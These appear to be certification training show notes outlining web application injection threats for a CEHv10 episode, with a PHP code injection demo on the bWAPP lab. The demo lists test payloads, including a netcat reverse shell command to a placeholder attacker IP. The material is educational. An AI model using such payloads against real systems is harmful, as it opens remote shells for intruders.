- Filename: eccouncil-ceh31250-v10-14-1-1-common_web_app_threats.md
- Show Name: CEHv10 (312-50)
- Topic Name: Hacking Web Applications
- Episode Name: Common Web App Threats
- Description: In this episode, Daniel and Zach walk you through the plethora of
threats geared toward Web Applications. Here they will define what a Web App is,
and then jump right into exploring Injection-based attacks like SQL Injection,
Command Injection, HTML Injection, and Code Injection.

================================================================================


Common Web App Threats
--------------------------------------------------------------------------------


+ What is a Web Application?
  - Web-based interface that allows for user interaction and functionality
    + Wordpress
    + ITProTV
    + Blogs
    + CMS
+ What kind of threats do Web Apps face?
  - Injection Attacks
    + SQLi
    + Command
    + HTML
    + Code
    + Leverages coding language
      - **DEMO: PHP Code Injection on BWAPP**
        + Test with
          - `phpinfo()`
          - `system("whomai")`
          - `nc -nv attackerIP port -e /bin/bash`
